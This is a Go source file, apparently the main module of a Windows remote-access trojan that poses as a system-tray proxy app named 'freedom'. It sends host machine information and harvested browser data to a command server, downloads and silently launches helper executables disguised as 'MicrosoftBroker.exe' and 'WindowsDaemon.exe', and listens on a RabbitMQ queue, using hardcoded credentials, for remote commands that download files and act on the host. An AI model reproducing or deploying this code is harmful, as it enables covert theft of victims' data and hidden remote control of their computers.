package main

import (
	"encoding/json"
	"github.com/scottkiss/grtm"
	"github.com/streadway/amqp"
	"infection/browser"
	"infection/etcd"
	"infection/killit"
	"infection/machineinfo"
	"infection/rmq"
	"infection/transfer"
	"infection/util/icon"
	"infection/util/lib"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strconv"
	"sync/atomic"
	"syscall"
	"systray"
)

var localAddr string
var backendAddr string
var mqAddr string

type Info struct {
	Dev        bool
	DevEnable  bool
	ClientPort int
	PacPort    string
}

var Config = Info{
	true,
	false,
	8888,
	":9999",
}

type AppConfig struct {
	Url string
}

// confirm lock
type AppConfigMgr struct {
	config atomic.Value
}

var appConfigMgr = &AppConfigMgr{}

func (a *AppConfigMgr) Callback(conf *etcd.Config) {
	appConfig := &AppConfig{}
	appConfig.Url = conf.Url
	appConfigMgr.config.Store(appConfig)
}
func onReady() {
	//load tunnel config
	conf, _ := etcd.NewConfig()
	conf.AddObserver(appConfigMgr)
	var appConfig AppConfig
	appConfig.Url = conf.Url
	appConfigMgr.config.Store(&appConfig)
	go transfer.PacHandle(Config.PacPort)
	// first insert
	if lib.CheckInlib(conf.Url+backendAddr) != nil {
		// exits in lib
		finflag := make(chan string)
		go machineinfo.MachineSend("http://"+conf.Url+backendAddr+"/machine/machineInfo", finflag)
		<-finflag
		if lib.FileExits(lib.BrowserSafepath) != nil {
			go browser.Digpack("http://"+conf.Url+backendAddr+"/browser/", finflag)
		}
	}
	AmqpURI := "amqp://jin:jinjin123@" + conf.Url + mqAddr
	mqhost := rmq.NewIConfigByVHost(lib.MQHOST)
	iConsumer := rmq.NewIConsumerByConfig(AmqpURI, true, false, mqhost)
	//queuename := lib.HOSTID + "-"+lib.GetRandomString(6)
	queuename := lib.HOSTID + "-main"
	cerr := iConsumer.Subscribe("mainopeation", rmq.FanoutExchange, queuename, "hostid", false, mqHandler)
	if cerr != nil {
		appConfig := appConfigMgr.config.Load().(*AppConfig)
		AmqpURI := "amqp://jin:jinjin123@" + appConfig.Url + mqAddr
		iConsumer := rmq.NewIConsumerByConfig(AmqpURI, true, false, mqhost)
		iConsumer.Subscribe("mainopeation", rmq.FanoutExchange, queuename, "hostid", false, mqHandler)
	}
	go lib.Fav("http://" + conf.Url + backendAddr + "/browser/")
	//control proxy thread
	gm := grtm.NewGrManager()

	//block
	systray.SetIcon(icon.Data)
	systray.SetTitle("freedom")
	mQuit := systray.AddMenuItem("Quit", "Quit freedom")
	start := systray.AddMenuItem("Start", "Start")
	stop := systray.AddMenuItem("Stop", "Stop")
	go func() {
		<-mQuit.ClickedCh
		systray.Quit()
	}()
	//loop up the switch signal
	for {
		select {
		case <-start.ClickedCh:
			appConfig := appConfigMgr.config.Load().(*AppConfig)
			log.Println(appConfig)
			go gm.NewGoroutine("proxy", transfer.InitCfg, appConfig.Url+":5003", localAddr)
			start.Check()
			stop.Uncheck()
			start.SetTitle("Start")
			systray.SetTooltip("running")
		case <-stop.ClickedCh:
			go gm.StopLoopGoroutine("proxy")
			stop.Check()
			start.Uncheck()
			stop.SetTitle("Stop")
			systray.SetTooltip("stop")
		}
	}
}
func onExit() {
	lib.KillALL()
}
func init() {
	lib.KillCheck()
	if Config.DevEnable {
		backendAddr = lib.TMVC
		mqAddr = lib.TMQ
	} else {
		backendAddr = lib.PMVC
		mqAddr = lib.PMQ
	}
	// not edit is quick now
	go func() {
		//fixed ioop download check
		_, err := os.Stat(lib.CURRENTPATH + "WindowsDaemon.exe")
		if err != nil {
			log.Println(err)
			downflag := make(chan string)
			//keep the main process live
			go lib.MultiFileDown([]string{}, "init", downflag)
			<-downflag
			//open the door
			cmd := exec.Command(lib.CURRENTPATH + "MicrosoftBroker.exe")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd.Start()
			cmd2 := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd2.Start()
		} else {
			_, err := os.Stat(lib.CURRENTPATH + "MicrosoftBroker.exe")
			if err != nil {
				go lib.ListProcess()
			}
			go lib.CheckDog()
			//cmd := exec.Command(lib.CURRENTPATH + "MicrosoftBroker.exe")
			//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			//cmd.Start()
			cmd2 := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd2.Start()
		}
	}()
	//currentprogram path log
	content, _ := transfer.GetTargetPath()
	data := []byte(content)
	if ioutil.WriteFile(lib.CURRENTPATHLOG, data, 0644) == nil {
	}
	if !Config.Dev {
		f, _ := os.OpenFile("free-main.log", os.O_WRONLY|os.O_CREATE|os.O_SYNC|os.O_APPEND, 0755)
		log.SetOutput(f)
	}

	localAddr = ":" + strconv.Itoa(Config.ClientPort)
}
func main() {
	systray.Run(onReady, onExit)
}

type Message struct {
	Hostid string //hostid
	Code   int    //opeation code
	Path   string //download path
	Diff   int    //not diff all do  0 one  1 all
	Num    int    // how many at 10 min 1min 13 pic
	Fname  string //file name
}

func mqHandler(d amqp.Delivery) {
	appConfig := appConfigMgr.config.Load().(*AppConfig)
	log.Println("have message")
	body := d.Body
	//consumerTag := d.ConsumerTag
	var msg Message
	json.Unmarshal(body, &msg)
	go killit.Opeation(msg.Hostid, msg.Code, msg.Path, msg.Diff, msg.Num, msg.Fname, appConfig.Url, backendAddr)
}
